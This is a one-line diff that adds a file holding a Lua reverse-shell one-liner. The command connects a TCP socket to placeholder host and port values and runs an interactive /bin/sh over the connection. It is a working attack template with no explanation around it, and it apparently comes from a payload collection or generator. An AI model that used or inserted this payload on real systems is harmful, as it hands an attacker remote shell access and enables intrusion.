@@ -1,0 +1,1 @@
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('__HOST__','__PORT__');os.execute('/bin/sh -i <&3 >&3 2>&3');"
